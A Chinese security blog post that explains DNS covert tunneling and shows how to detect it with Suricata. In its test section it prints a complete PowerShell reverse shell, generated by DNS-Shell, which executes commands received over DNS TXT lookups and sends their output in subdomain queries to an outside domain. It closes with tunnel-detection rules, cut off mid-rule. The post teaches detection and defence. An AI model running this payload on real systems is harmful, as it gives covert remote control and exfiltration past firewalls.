<!DOCTYPE html>
<html lang="zh">

<head>
  <!-- Required meta tags always come first -->
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="google-site-verification" content="GgupatpoZgdqsBlxEZoMqGAy3aXAFtXIrYged3SB6EA" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <title>NIDS（suricata） 中的 DNS隐蔽隧道检测 | nJcx's Blog
</title>
  <link rel="canonical" href="https://www.njcx.bid/posts/M5.html">


  <link rel="apple-touch-icon" href="https://www.njcx.bid/apple-touch-icon.png" sizes="180x180">
  <link rel="icon" type="image/png" href="https://www.njcx.bid/favicon-32x32.png" sizes="32x32">
  <link rel="icon" type="image/png" href="https://www.njcx.bid/favicon-16x16.png" sizes="16x16">
  <link rel="manifest" href="https://www.njcx.bid/manifest.json">
  <meta name="theme-color" content="#333333">

  <link rel="stylesheet" href="https://www.njcx.bid/theme/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://www.njcx.bid/theme/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://www.njcx.bid/theme/css/pygments/emacs.min.css">
  <link rel="stylesheet" href="https://www.njcx.bid/theme/css/style.css">


<meta name="description" content="NIDS 中的 DNS隐蔽隧道检测~">
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?a34c7a96ae9745547c373575407c521f";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>

<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>

</head>

<body>
  <header class="header">
    <div class="container">
      <div class="row">
        <div class="col-sm-4">
          <a href="https://www.njcx.bid">
            <img class="img-fluid" src=https://www.njcx.bid/images/profile.png width=200 height=200 alt="nJcx's Blog">
          </a>
        </div>
        <div class="col-sm-8">
          <h1 class="title">&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<a href="https://www.njcx.bid">nJcx's Blog</a></h1>
          <p class="text-muted">十年生死两茫茫，写程序，到天亮。相顾无言，惟有泪千行</p>
          <ul class="list-inline">
                    <li class="list-inline-item">&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<a href="https://www.zhihu.com/people/njcxs" target="_blank">知乎</a></li>
                <li class="list-inline-item"><a href="https://www.anquanke.com/member/154147" target="_blank">安全客</a></li>
                <li class="list-inline-item"><a href="https://www.freebuf.com/column/1481" target="_blank">Freebuf</a></li>
            <li class=" list-inline-item text-muted">|</li>
            <li class="list-inline-item"><a class="fa fa-github" href="https://github.com/njcx" target="_blank"></a></li>
          </ul>
        </div>
      </div>
    </div>
  </header>

  <div class="main">
    <div class="container">
      <h1>NIDS（suricata） 中的 DNS隐蔽隧道检测
</h1>
      <hr>
<article class="article">
  <header>
    <ul class="list-inline">
      <li class="list-inline-item text-muted" title="2019-07-08T20:20:00+03:00">
        <i class="fa fa-clock-o"></i>
        一 08 七月 2019
      </li>
      <li class="list-inline-item">
        <i class="fa fa-folder-open-o"></i>
        <a href="https://www.njcx.bid/category/an-quan.html">安全</a>
      </li>
      <li class="list-inline-item">
        <i class="fa fa-user-o"></i>
        <a href="https://www.njcx.bid/author/njcx.html">nJcx</a>      </li>
      <li class="list-inline-item">
        <i class="fa fa-files-o"></i>
        <a href="https://www.njcx.bid/tag/nids.html">#nids</a>      </li>
    </ul>
  </header>
  <div class="content">
    <h4>DNS介绍</h4>
<p><img alt="icmp" class="img-fluid" src="../images/tcpip.gif"/></p>
<p>我们先简单介绍一下 DNS协议，DNS协议是一个应用层协议，用来将域名转换为IP地址（也可以将IP地址转换为相应的域名地址），类似一个分布式数据库，数据通过udp传输,IP报头中的协议字段值为17.</p>
<p>DNS协议报文格式</p>
<p><img alt="dns" class="img-fluid" src="../images/dns-protocol-format.png"/></p>
<p>通过wireshark 抓到的包：</p>
<p><img alt="dns" class="img-fluid" src="../images/dnswireshark.png"/></p>
<p>由于关于dns报文介绍太长，参考下面url </p>
<p><a href="https://www.cnblogs.com/davidwang456/articles/10660051.html">DNS协议详解及报文格式分析</a></p>
<p><img alt="dns" class="img-fluid" src="../images/dnsq.jpeg"/></p>
<p>关于DNS请求的方式如图，
具体可描述如下： </p>
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="m">1</span>.<span class="w"> </span>主机先向本地域名服务器进行递归查询<span class="w"> </span>

<span class="w">    </span><span class="m">2</span>.<span class="w"> </span>本地域名服务器采用迭代查询，向一个根域名服务器进行查询<span class="w"> </span>

<span class="w">    </span><span class="m">3</span>.<span class="w"> </span>根域名服务器告诉本地域名服务器，下一次应该查询的顶级域名服务器的IP地址<span class="w"> </span>

<span class="w">    </span><span class="m">4</span>.<span class="w"> </span>本地域名服务器向顶级域名服务器进行查询<span class="w"> </span>

<span class="w">    </span><span class="m">5</span>.<span class="w"> </span>顶级域名服务器告诉本地域名服务器，下一步查询权限服务器的IP地址<span class="w"> </span>

<span class="w">    </span><span class="m">6</span>.<span class="w"> </span>本地域名服务器向权威服务器进行查询<span class="w"> </span>

<span class="w">    </span><span class="m">7</span>.<span class="w"> </span>权限服务器告诉本地域名服务器所查询的主机的IP地址<span class="w"> </span>

<span class="w">    </span><span class="m">8</span>.<span class="w"> </span>本地域名服务器最后把查询结果告诉主机<span class="w"> </span>
</code></pre></div>
<p><img alt="dns" class="img-fluid" src="../images/dnstun.jpeg"/></p>
<p>如果在企业内网，那么黑客的攻击机器，就是所谓的权威服务器</p>
<div class="highlight"><pre><span></span><code><span class="w">    </span>第一步:<span class="w"> </span>受控机向内部dns服务器发送一个查询NKNFjklKLuJNVIUM.ml.org的请求

<span class="w">    </span>第二步：内部dns服务器通过防火墙向根dns服务器发出查询请求

<span class="w">    </span>第三步：经过大量迭代后，DNS请求到达NKNFjklKLuJNVIUM.ml.org的权威DNS服务器（黑客所控制）

<span class="w">    </span>第四步：受控机请求查询的响应通过防火墙返回到内部DNS服务器

<span class="w">    </span>第五步：内部DNS服务器将响应结果返回给受控机
</code></pre></div>
<p>上面的流程展示了一个受控机在连接外部网络时dns解析的一个过程。由于防火墙并没有对dns协议做任何处理，所以我们可以通过这种方式来穿透防火墙。</p>
<p>这里很多人会有一个疑问，关于dns 请求查询NKNFjklKLuJNVIUMvKL.ml.org 是怎么到达黑客所控制的权威DNS服务器的？</p>
<p>请求一个域名，比如NKNFjklKLuJNVIUMvKL.ml.org ,本地DNS服务器上没有 NKNFjklKLuJNVIUMvKL.ml.org，那么它将向root，也就是根域名服务器请求，看看根知道不, root一看是.org的域名，就交 给.org域名服务器进行解析，.org的域名服务器一看是.ml.org那么就会去找.ml.org的域名服务器 (ns1.myhostadmin.net),看看它有没有这条记录，.ml.org的域名服务器上一看是.ml.org，如果它有这 条A记录，那么就会返回NKNFjklKLuJNVIUMvKL.ml.org 的记录。</p>
<p>但是，如果没有，你可以再在ml.org的域名服务器上设定一个NS 类型的记录，如：ml.org NS 111.222.333.444(通常这里不让设置为地址，你可以先在DNS服务器上添加一条A记录，如ns.ml.org A 111.222.333.444，再添加NS记录：ml.org NS ns.xxx.org)，这里指定一个公网服务器，就是黑客所控制的权威DNS服务器。</p>
<h4>测试</h4>
<p>我们测试一下使用dns反弹shell，用于测试的域名： test.njcx.bid</p>
<p>该域名的dns服务器位于  ns1.njcx.bid（公网ip：111.222.333.444）</p>
<p>受控机Windows7 ：  172.16.42.134</p>
<p>控制机 CentOS7：  111.222.333.444</p>
<p>我们用到的工具
<a href="https://github.com/sensepost/DNS-Shell">DNS-Shell</a>，我们在 CentOS7 上面执行  python DNS-shell.py -l -r test.njcx.bid ，接收由受控机过来的shell，执行后会生成一个 powershell的payload,保存为 ps1 Windows执行即可收到shell</p>
<div class="highlight"><pre><span></span><code><span class="nv">$url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"test.njcx.bid"</span><span class="p">;</span>
<span class="k">function</span><span class="w"> </span>execDNS<span class="o">(</span><span class="nv">$cmd</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="nv">$c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>iex<span class="w"> </span><span class="nv">$cmd</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Out-String<span class="p">;</span>
<span class="nv">$u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>system.Text.Encoding<span class="o">]</span>::UTF8.GetBytes<span class="o">(</span><span class="nv">$c</span><span class="o">)</span><span class="p">;</span>
<span class="nv">$string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>System.BitConverter<span class="o">]</span>::ToString<span class="o">(</span><span class="nv">$u</span><span class="o">)</span><span class="p">;</span>
<span class="nv">$string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$string</span><span class="w"> </span>-replace<span class="w"> </span><span class="s1">'-'</span>,<span class="s1">''</span><span class="p">;</span>
<span class="nv">$len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$string</span>.Length<span class="p">;</span>
<span class="nv">$split</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">50</span><span class="p">;</span>
<span class="nv">$repeat</span><span class="o">=[</span>Math<span class="o">]</span>::Floor<span class="o">(</span><span class="nv">$len</span>/<span class="nv">$split</span><span class="o">)</span><span class="p">;</span>
<span class="nv">$remainder</span><span class="o">=</span><span class="nv">$len</span>%<span class="nv">$split</span><span class="p">;</span>
<span class="k">if</span><span class="o">(</span><span class="nv">$remainder</span><span class="o">){</span><span class="w"> </span><span class="nv">$repeatr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$repeat</span>+1<span class="o">}</span><span class="p">;</span>
<span class="nv">$rnd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Get-Random<span class="p">;</span><span class="nv">$ur</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$rnd</span>.toString<span class="o">()</span>+<span class="s2">".CMDC"</span>+<span class="nv">$repeatr</span>.ToString<span class="o">()</span>+<span class="s2">"."</span>+<span class="nv">$url</span><span class="p">;</span>
<span class="nv">$q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>nslookup<span class="w"> </span>-querytype<span class="o">=</span>A<span class="w"> </span><span class="nv">$ur</span><span class="p">;</span>
<span class="k">for</span><span class="o">(</span><span class="nv">$i</span><span class="o">=</span><span class="m">0</span><span class="p">;</span><span class="nv">$i</span>-lt<span class="nv">$repeat</span><span class="p">;</span><span class="nv">$i</span>++<span class="o">){</span>
<span class="w">    </span><span class="nv">$str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$string</span>.Substring<span class="o">(</span><span class="nv">$i</span>*<span class="nv">$Split</span>,<span class="nv">$Split</span><span class="o">)</span><span class="p">;</span>
<span class="w">    </span><span class="nv">$rnd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Get-Random<span class="p">;</span><span class="nv">$ur1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$rnd</span>.toString<span class="o">()</span>+<span class="s2">".CMD"</span>+<span class="nv">$i</span>.ToString<span class="o">()</span>+<span class="s2">"."</span>+<span class="nv">$str</span>+<span class="s2">"."</span>+<span class="nv">$url</span><span class="p">;</span>
<span class="w">    </span><span class="nv">$q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>nslookup<span class="w"> </span>-querytype<span class="o">=</span>A<span class="w"> </span><span class="nv">$ur1</span><span class="p">;</span>
<span class="o">}</span><span class="p">;</span>
<span class="k">if</span><span class="o">(</span><span class="nv">$remainder</span><span class="o">){</span>
<span class="w">    </span><span class="nv">$str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$string</span>.Substring<span class="o">(</span><span class="nv">$len</span>-<span class="nv">$remainder</span><span class="o">)</span><span class="p">;</span>
<span class="w">    </span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$i</span><span class="w"> </span>+1
<span class="w">    </span><span class="nv">$rnd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Get-Random<span class="p">;</span><span class="nv">$ur2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$rnd</span>.toString<span class="o">()</span>+<span class="s2">".CMD"</span>+<span class="nv">$i</span>.ToString<span class="o">()</span>+<span class="s2">"."</span>+<span class="nv">$str</span>+<span class="s2">"."</span>+<span class="nv">$url</span><span class="p">;</span>
<span class="w">    </span><span class="nv">$q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>nslookup<span class="w"> </span>-querytype<span class="o">=</span>A<span class="w"> </span><span class="nv">$ur2</span><span class="p">;</span>
<span class="o">}</span><span class="p">;</span>
<span class="nv">$rnd</span><span class="o">=</span>Get-Random<span class="p">;</span><span class="nv">$s</span><span class="o">=</span><span class="nv">$rnd</span>.ToString<span class="o">()</span>+<span class="s2">".END."</span>+<span class="nv">$url</span><span class="p">;</span><span class="nv">$q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>nslookup<span class="w"> </span>-querytype<span class="o">=</span>A<span class="w"> </span><span class="nv">$s</span><span class="p">;</span>
<span class="o">}</span><span class="p">;</span>
<span class="k">while</span><span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="o">){</span>
<span class="w">   </span><span class="nv">$c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Get-Random<span class="p">;</span>
<span class="w">   </span>Start-Sleep<span class="w"> </span>-s<span class="w"> </span><span class="m">3</span>
<span class="w">   </span><span class="nv">$u</span><span class="o">=</span><span class="nv">$c</span>.ToString<span class="o">()</span>+<span class="s2">"."</span>+<span class="nv">$url</span><span class="p">;</span><span class="nv">$txt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>nslookup<span class="w"> </span>-querytype<span class="o">=</span>TXT<span class="w"> </span><span class="nv">$u</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Out-String
<span class="w">   </span><span class="nv">$txt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$txt</span>.split<span class="o">(</span><span class="s2">"`n"</span><span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>%<span class="o">{</span><span class="nv">$_</span>.split<span class="o">(</span><span class="s1">'"'</span><span class="o">)[</span><span class="m">1</span><span class="o">]}</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Out-String
<span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">$txt</span><span class="w"> </span>-match<span class="w"> </span><span class="s1">'NoCMD'</span><span class="o">){</span><span class="k">continue</span><span class="o">}</span>
<span class="w">   </span>elseif<span class="w"> </span><span class="o">(</span><span class="nv">$txt</span><span class="w"> </span>-match<span class="w"> </span><span class="s1">'exit'</span><span class="o">){</span>Exit<span class="o">}</span>
<span class="w">   </span><span class="k">else</span><span class="o">{</span>execDNS<span class="o">(</span><span class="nv">$txt</span><span class="o">)}</span>
<span class="o">}</span><span class="w">   </span>
</code></pre></div>
<p>shell 如下，</p>
<p><img alt="dnsshell" class="img-fluid" src="../images/dnsshell.png"/></p>
<p>我在被控机上抓包，如图，可以看出受控机器一直TXT请求 CentOS 控制机</p>
<p><img alt="dnsshell" class="img-fluid" src="../images/WechatIMG25.jpeg"/></p>
<p><img alt="dnsshell" class="img-fluid" src="../images/WechatIMG26.jpeg"/></p>
<p>可以看出我们的payload是 放到TXT字段里面，由CentOS 控制机响应给客户端的</p>
<p><img alt="dnsshell" class="img-fluid" src="../images/WechatIMG21.jpeg"/></p>
<p>然后，数据都分段放到子域名里面，分多次，再次用请求的方式，发送到我们的控制机器上了</p>
<p><img alt="dnsshell" class="img-fluid" src="../images/WechatIMG23.jpeg"/></p>
<h4>检测</h4>
<p>我们可以看出一些特征 ：</p>
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="m">1</span>，<span class="w"> </span>请求的Type一般都是TXT（为了返回的时候能够加入更多的信息）。
<span class="w">    </span><span class="m">2</span>，<span class="w"> </span>payload部分一般都会编码（可能为base64、2进制或16进制）后放到子域名里面，而且多变，不一致
<span class="w">    </span><span class="m">3</span>，<span class="w"> </span>DNS发生频率很高，短时间为了发送大量数据，会产生大量请求
</code></pre></div>
<p>比如，DNS  TXT请求频率过高，就报警，例子如下</p>
<div class="highlight"><pre><span></span><code>alert<span class="w"> </span>udp<span class="w"> </span>any<span class="w"> </span>any<span class="w"> </span>-&gt;<span class="w"> </span>any<span class="w"> </span><span class="m">53</span><span class="w"> </span><span class="o">(</span>msg:<span class="s2">"High TXT requests - Potential DNS Tunneling"</span><span class="p">;</span><span class="w"> </span>content:<span class="s2">"|01 00|"</span><span class="p">;</span><span class="w"> </span>offset:2<span class="p">;</span><span class="w"> </span>within<span class="w"> </span>:4<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|00 00 10 00 01|"</span><span class="p">;</span><span class="w"> </span>offset:12<span class="p">;</span><span class="w"> </span>within:255<span class="p">;</span><span class="w"> </span>threshold:<span class="w"> </span><span class="nb">type</span><span class="w"> </span>threshold,<span class="w"> </span>track<span class="w"> </span>by_src,<span class="w"> </span>count<span class="w"> </span><span class="m">10</span>,<span class="w"> </span>seconds<span class="w"> </span><span class="m">5</span><span class="p">;</span><span class="w"> </span>sid:<span class="w"> </span><span class="m">5700002</span><span class="p">;</span><span class="w"> </span>rev:<span class="w"> </span><span class="m">1</span><span class="p">;</span><span class="o">)</span>
</code></pre></div>
<p>下面，收集了很多知名DNS利用工具的检测规则。</p>
<div class="highlight"><pre><span></span><code>alert<span class="w"> </span>udp<span class="w"> </span><span class="nv">$EXTERNAL_NET</span><span class="w"> </span><span class="m">53</span><span class="w"> </span>-&gt;<span class="w"> </span><span class="nv">$HOME_NET</span><span class="w"> </span>any<span class="w"> </span><span class="o">(</span>msg:<span class="s2">"APP-DETECT iodine dns tunneling handshake server ACK"</span><span class="p">;</span><span class="w"> </span>flow:to_client<span class="p">;</span><span class="w"> </span>byte_test:1,<span class="p">&amp;</span>,0x80,2<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|00 01 00 01 00|"</span><span class="p">;</span><span class="w"> </span>depth:5<span class="p">;</span><span class="w"> </span>offset:4<span class="p">;</span><span class="w"> </span>content:<span class="s2">"v"</span><span class="p">;</span><span class="w"> </span>within:1<span class="p">;</span><span class="w"> </span>distance:4<span class="p">;</span><span class="w"> </span>content:<span class="s2">"VACK"</span><span class="p">;</span><span class="w"> </span>within:200<span class="p">;</span><span class="w"> </span>fast_pattern<span class="p">;</span><span class="w"> </span>metadata:service<span class="w"> </span>dns<span class="p">;</span><span class="w"> </span>reference:url,code.kryo.se/iodine/README.html<span class="p">;</span><span class="w"> </span>classtype:policy-violation<span class="p">;</span><span class="w"> </span>sid:27046<span class="p">;</span><span class="w"> </span>rev:3<span class="p">;</span><span class="o">)</span>

alert<span class="w"> </span>udp<span class="w"> </span><span class="nv">$HOME_NET</span><span class="w"> </span>any<span class="w"> </span>-&gt;<span class="w"> </span>any<span class="w"> </span><span class="m">53</span><span class="w"> </span><span class="o">(</span>msg:<span class="s2">"APP-DETECT OzymanDNS dns tunneling up attempt"</span><span class="p">;</span><span class="w"> </span>flow:to_server,no_stream<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|01 00 00 01 00 00 00 00 00 00|"</span><span class="p">;</span><span class="w"> </span>depth:10<span class="p">;</span><span class="w"> </span>offset:2<span class="p">;</span><span class="w"> </span>content:<span class="s2">"-0"</span><span class="p">;</span><span class="w"> </span>distance:6<span class="p">;</span><span class="w"> </span>content:<span class="s2">"id-"</span><span class="p">;</span><span class="w"> </span>within:3<span class="p">;</span><span class="w"> </span>distance:1<span class="p">;</span><span class="w"> </span>fast_pattern<span class="p">;</span><span class="w"> </span>content:<span class="s2">"up"</span><span class="p">;</span><span class="w"> </span>within:8<span class="p">;</span><span class="w"> </span>detection_filter:track<span class="w"> </span>by_src,<span class="w"> </span>count<span class="w"> </span><span class="m">18</span>,<span class="w"> </span>seconds<span class="w"> </span><span class="m">1</span><span class="p">;</span><span class="w"> </span>metadata:impact_flag<span class="w"> </span>red,<span class="w"> </span>service<span class="w"> </span>dns<span class="p">;</span><span class="w"> </span>reference:url,dankaminsky.com/2004/07/29/51/<span class="p">;</span><span class="w"> </span>classtype:policy-violation<span class="p">;</span><span class="w"> </span>sid:27540<span class="p">;</span><span class="w"> </span>rev:4<span class="p">;</span><span class="o">)</span>

alert<span class="w"> </span>udp<span class="w"> </span><span class="nv">$HOME_NET</span><span class="w"> </span>any<span class="w"> </span>-&gt;<span class="w"> </span>any<span class="w"> </span><span class="m">53</span><span class="w"> </span><span class="o">(</span>msg:<span class="s2">"APP-DETECT OzymanDNS dns tunneling down attempt"</span><span class="p">;</span><span class="w"> </span>flow:to_server,no_stream<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|01 00 00 01 00 00 00 00 00 00|"</span><span class="p">;</span><span class="w"> </span>depth:10<span class="p">;</span><span class="w"> </span>offset:2<span class="p">;</span><span class="w"> </span>content:<span class="s2">"id-"</span><span class="p">;</span><span class="w"> </span>distance:6<span class="p">;</span><span class="w"> </span>fast_pattern<span class="p">;</span><span class="w"> </span>content:<span class="s2">"down"</span><span class="p">;</span><span class="w"> </span>within:10<span class="p">;</span><span class="w"> </span>distance:2<span class="p">;</span><span class="w"> </span>detection_filter:track<span class="w"> </span>by_dst,<span class="w"> </span>count<span class="w"> </span><span class="m">8</span>,<span class="w"> </span>seconds<span class="w"> </span><span class="m">1</span><span class="p">;</span><span class="w"> </span>metadata:impact_flag<span class="w"> </span>red,<span class="w"> </span>service<span class="w"> </span>dns<span class="p">;</span><span class="w"> </span>reference:url,dankaminsky.com/2004/07/29/51/<span class="p">;</span><span class="w"> </span>classtype:policy-violation<span class="p">;</span><span class="w"> </span>sid:27541<span class="p">;</span><span class="w"> </span>rev:4<span class="p">;</span><span class="o">)</span>

alert<span class="w"> </span>udp<span class="w"> </span><span class="nv">$HOME_NET</span><span class="w"> </span>any<span class="w"> </span>-&gt;<span class="w"> </span>any<span class="w"> </span><span class="m">53</span><span class="w"> </span><span class="o">(</span>msg:<span class="s2">"APP-DETECT Your-Freedom DNS tunneling query attempt"</span><span class="p">;</span><span class="w"> </span>flow:to_server<span class="p">;</span><span class="w"> </span>byte_test:1,!<span class="p">&amp;</span>,0xF8,2<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|03|s"</span><span class="p">;</span><span class="w"> </span>nocase<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|03|1yf|02|de|00|"</span><span class="p">;</span><span class="w"> </span>distance:2<span class="p">;</span><span class="w"> </span>nocase<span class="p">;</span><span class="w"> </span>metadata:service<span class="w"> </span>dns<span class="p">;</span><span class="w"> </span>reference:url,your-freedom.net<span class="p">;</span><span class="w"> </span>classtype:misc-activity<span class="p">;</span><span class="w"> </span>sid:34496<span class="p">;</span><span class="w"> </span>rev:1<span class="p">;</span><span class="o">)</span>

alert<span class="w"> </span>udp<span class="w"> </span><span class="nv">$EXTERNAL_NET</span><span class="w"> </span><span class="m">53</span><span class="w"> </span>-&gt;<span class="w"> </span>any<span class="w"> </span>any<span class="w"> </span><span class="o">(</span>msg:<span class="s2">"APP-DETECT Your-Freedom DNS tunneling query response attempt"</span><span class="p">;</span><span class="w"> </span>flow:to_client<span class="p">;</span><span class="w"> </span>byte_test:1,!<span class="p">&amp;</span>,0x01,2<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|03|s"</span><span class="p">;</span><span class="w"> </span>nocase<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|03|1yf|02|de|00|"</span><span class="p">;</span><span class="w"> </span>distance:2<span class="p">;</span><span class="w"> </span>nocase<span class="p">;</span><span class="w"> </span>metadata:service<span class="w"> </span>dns<span class="p">;</span><span class="w"> </span>reference:url,your-freedom.net<span class="p">;</span><span class="w"> </span>classtype:misc-activity<span class="p">;</span><span class="w"> </span>sid:34497<span class="p">;</span><span class="w"> </span>rev:1<span class="p">;</span><span class="o">)</span>

alert<span class="w"> </span>udp<span class="w"> </span><span class="nv">$HOME_NET</span><span class="w"> </span>any<span class="w"> </span>-&gt;<span class="w"> </span>any<span class="w"> </span><span class="m">53</span><span class="w"> </span><span class="o">(</span>msg:<span class="s2">"INDICATOR-OBFUSCATION DNS tunneling attempt"</span><span class="p">;</span><span class="w"> </span>flow:to_server<span class="p">;</span><span class="w"> </span>byte_test:1,!<span class="p">&amp;</span>,0xF8,2<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|00 01 00 00 00 00 00 00 1A|"</span><span class="p">;</span><span class="w"> </span>depth:9<span class="p">;</span><span class="w"> </span>offset:4<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|1A|"</span><span class="p">;</span><span class="w"> </span>within:1<span class="p">;</span><span class="w"> </span>distance:26<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|02|"</span><span class="p">;</span><span class="w"> </span>within:2<span class="p">;</span><span class="w"> </span>distance:26<span class="p">;</span><span class="w"> </span>metadata:service<span class="w"> </span>dns<span class="p">;</span><span class="w"> </span>classtype:policy-violation<span class="p">;</span><span class="w"> </span>sid:25983<span class="p">;</span><span class="w"> </span>rev:2<span class="p">;</span><span class="o">)</span>

alert<span class="w"> </span>udp<span class="w"> </span><span class="nv">$EXTERNAL_NET</span><span class="w"> </span><span class="m">53</span><span class="w"> </span>-&gt;<span class="w"> </span><span class="nv">$HOME_NET</span><span class="w"> </span>any<span class="w"> </span><span class="o">(</span>msg:<span class="s2">"INDICATOR-OBFUSCATION DNS tunneling attempt"</span><span class="p">;</span><span class="w"> </span>flow:to_client,no_stream<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|00 01 00 01 00 00 00 00|"</span><span class="p">;</span><span class="w"> </span>depth:8<span class="p">;</span><span class="w"> </span>offset:4<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|00 07 06|(){}[]"</span><span class="p">;</span><span class="w"> </span>fast_pattern<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|00 0A 00 01|"</span><span class="p">;</span><span class="w"> </span>within:4<span class="p">;</span><span class="w"> </span>distance:-17<span class="p">;</span><span class="w"> </span>detection_filter:track<span class="w"> </span>by_src,<span class="w"> </span>count<span class="w"> </span><span class="m">25</span>,<span class="w"> </span>seconds<span class="w"> </span><span class="m">1</span><span class="p">;</span><span class="w"> </span>metadata:service<span class="w"> </span>dns<span class="p">;</span><span class="w"> </span>classtype:policy-violation<span class="p">;</span><span class="w"> </span>sid:37891<span class="p">;</span><span class="w"> </span>rev:2<span class="p">;</span><span class="o">)</span>

alert<span class="w"> </span>udp<span class="w"> </span><span class="nv">$HOME_NET</span><span class="w"> </span>any<span class="w"> </span>-&gt;<span class="w"> </span><span class="nv">$EXTERNAL_NET</span><span class="w"> </span><span class="m">53</span><span class="w"> </span><span class="o">(</span>msg:<span class="s2">"INDICATOR-OBFUSCATION DNS tunneling attempt"</span><span class="p">;</span><span class="w"> </span>flow:to_server,no_stream<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|00 01 00 00 00 00 00 00|"</span><span class="p">;</span><span class="w"> </span>depth:8<span class="p">;</span><span class="w"> </span>offset:4<span class="p">;</span><span class="w"> </span>isdataat:80,relative<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|00 0A 00 01|"</span><span class="p">;</span><span class="w"> </span>within:15<span class="p">;</span><span class="w"> </span>distance:80<span class="p">;</span><span class="w"> </span>fast_pattern<span class="p">;</span><span class="w"> </span>detection_filter:track<span class="w"> </span>by_src,<span class="w"> </span>count<span class="w"> </span><span class="m">25</span>,<span class="w"> </span>seconds<span class="w"> </span><span class="m">1</span><span class="p">;</span><span class="w"> </span>metadata:service<span class="w"> </span>dns<span class="p">;</span><span class="w"> </span>classtype:policy-violation<span class="p">;</span><span class="w"> </span>sid:37892<span class="p">;</span><span class="w"> </span>rev:2<span class="p">;</span><span class="o">)</span>

sid:2100208<span class="w"> </span><span class="o">(</span>Tunneling<span class="w"> </span>IP<span class="w"> </span>over<span class="w"> </span>DNS<span class="w"> </span>with<span class="w"> </span>NSTX<span class="o">)</span>
alert<span class="w"> </span>udp<span class="w"> </span>any<span class="w"> </span>any<span class="w"> </span>-&gt;<span class="w"> </span>any<span class="w"> </span><span class="m">53</span><span class="w"> </span><span class="o">(</span>msg:<span class="s2">"GPL POLICY MISC Tunneling IP over DNS with NSTX"</span><span class="p">;</span><span class="w"> </span>byte_test:<span class="w"> </span><span class="m">1</span>,&gt;,32,12<span class="p">;</span><span class="w"> </span>content:<span class="w"> </span><span class="s2">"|00 10 00 01|"</span><span class="p">;</span><span class="w"> </span>offset:<span class="w"> </span><span class="m">12</span><span class="p">;</span><span class="w"> </span>rawbytes<span class="p">;</span><span class="w"> </span>threshold:<span class="w"> </span><span class="nb">type</span><span class="w"> </span>threshold,<span class="w"> </span>track<span class="w"> </span>by_src,<span class="w"> </span>count<span class="w"> </span><span class="m">50</span>,<span class="w"> </span>seconds<span class="w"> </span><span class="m">60</span><span class="p">;</span><span class="w"> </span>reference:url,nstx.dereference.de/nstx/<span class="p">;</span><span class="w"> </span>reference:url,slashdot.org/articles/00/09/10/2230242.shtml<span class="p">;</span><span class="w"> </span>classtype:policy-violation<span class="p">;</span><span 